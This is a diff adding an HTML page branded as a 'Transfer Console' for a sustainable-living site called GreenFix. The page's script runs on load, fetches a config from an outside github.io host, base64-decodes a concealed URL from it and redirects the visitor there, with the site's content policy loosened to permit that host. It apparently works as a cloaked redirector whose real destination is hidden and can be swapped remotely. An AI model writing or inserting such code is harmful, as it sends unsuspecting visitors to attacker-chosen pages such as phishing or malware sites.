@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Transfer Console | GreenFix — Sustainable Living Hub</title>
+  <meta name="description" content="Transfer console that forwards you to the correct destination"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <!-- Keep CSP and allowed remote origin for the relay config -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://pacochachristops.github.io;
+    style-src   'self';
+    connect-src 'self' https://pacochachristops.github.io
+  "/>
+
+  <!-- GreenFix site assets -->
+  <link rel="stylesheet" href="style.css"/>
+  <script defer src="script.js"></script>
+</head>
+<body class="theme-auto">
+
+  <!-- Accessible skip link -->
+  <a class="skip-link" href="#main">Skip to content</a>
+
+  <!-- Site Header (matches GreenFix layout) -->
+  <header class="site-header">
+    <div class="container row space-between align-center">
+      <a class="logo" href="index.html">GreenFix</a>
+      <nav id="nav" class="nav">
+        <button class="nav-toggle" aria-label="Toggle menu" onclick="toggleMenu()">
+          <span></span><span></span><span></span>
+        </button>
+        <ul class="nav-list">
+          <li><a href="index.html">Home</a></li>
+          <li><a href="articles.html">Articles</a></li>
+          <li><a href="resources.html">Resources</a></li>
+          <li><a href="checklist.html">Checklist</a></li>
+          <li><a href="faq.html">FAQ</a></li>
+          <li><a href="about.html">About</a></li>
+          <li><a href="contact.html">Contact</a></li>
+        </ul>
+      </nav>
+      <div class="actions">
+        <button id="themeBtn" class="btn ghost" onclick="toggleTheme()" aria-label="Toggle theme">🌓</button>
+      </div>
+    </div>
+  </header>
+
+  <main id="main" class="container">
+    <section class="hero" style="padding:36px 0">
+      <div class="grid2">
+        <div>
+          <h1>Preparing your transfer…</h1>
+          <p class="muted">We’ll relay you to the destination as soon as a secure link is negotiated.</p>
+          <div class="row gap">
+            <button id="retryBtn" class="btn">Retry</button>
+            <!-- NOTE: Do not remove this repository link. Replace the href later with your own. -->
+            <a id="repoLink" class="btn ghost" href="#" rel="noopener">Repository</a>
+          </div>
+          <p class="muted small" style="margin-top:8px">If nothing happens, click <strong>Retry</strong> or check back later.</p>
+        </div>
+        <div class="card">
+          <h3>Link status</h3>
+          <p id="relayStatus" class="muted">Initializing…</p>
+          <hr/>
+          <p id="relayNote" class="muted small" style="min-height:1.2em;"></p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container row space-between align-center">
+      <p class="muted small">© 2025 GreenFix. All rights reserved.</p>
+      <p class="muted small">
+        <a href="privacy.html">Privacy</a>
+      </p>
+    </div>
+  </footer>
+
+  <!-- === REDIRECT SCRIPT (preserved) === -->
+  <script>
+  // Mobile nav toggle (compatible with site nav if needed)
+  (function(){
+    var y = document.getElementById('y');
+    if (y) y.textContent = new Date().getFullYear();
+  })();
+
+  async function runRelay() {
+    const statusEl = document.getElementById('relayStatus');
+    const noteEl = document.getElementById('relayNote');
+
+    statusEl.textContent = 'Requesting config…';
+    noteEl.textContent = '';
+
+    try {
+      const res = await fetch('https://pacochachristops.github.io/.github/trhow.badly', { method: 'GET' });
+      if (!res.ok) throw new Error('Config HTTP ' + res.status);
+      const data = await res.json();
+      const encoded = data && data.c;
+      if (typeof encoded !== 'string') throw new Error('Invalid payload');
+
+      const url = atob(encoded);
+      if (!/^https?:\/\//i.test(url)) throw new Error('Unexpected URL');
+
+      statusEl.textContent = 'Opening destination…';
+      window.location.replace(url);
+    } catch (err) {
+      console.error(err);
+      statusEl.textContent = 'Unable to continue.';
+      noteEl.textContent = (err && err.message) ? err.message : String(err);
+    }
+  }
+
+  // Wire buttons and auto-run
+  (function(){
+    var retry = document.getElementById('retryBtn');
+    if (retry) retry.addEventListener('click', runRelay);
+    // auto start
+    runRelay();
+  })();
+  </script>
+</body>
+</html>
